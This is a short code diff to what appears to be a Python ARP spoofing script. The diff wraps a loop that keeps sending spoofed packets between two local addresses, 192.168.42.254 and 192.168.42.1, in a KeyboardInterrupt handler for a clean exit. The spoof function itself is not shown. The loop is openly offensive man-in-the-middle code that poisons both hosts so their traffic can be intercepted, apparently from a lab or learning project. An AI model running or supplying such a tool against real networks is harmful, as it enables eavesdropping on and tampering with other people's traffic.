@@ -18,11 +18,15 @@ def spoof(targetIP, spoofIP):
     
 packetsCount = 0    
 
-while True:
-    spoof("192.168.42.254", "192.168.42.1")
-    spoof("192.168.42.1", "192.168.42.254")
-    
-    packetsCount += 2
-    print(f"\r[+] Packets sent: {packetsCount}", end="")
-    
-    time.sleep(1)
+
+try:
+    while True:
+        spoof("192.168.42.254", "192.168.42.1")
+        spoof("192.168.42.1", "192.168.42.254")
+        
+        packetsCount += 2
+        print(f"\r[+] Packets sent: {packetsCount}", end="")
+        
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("[+] Quitting")
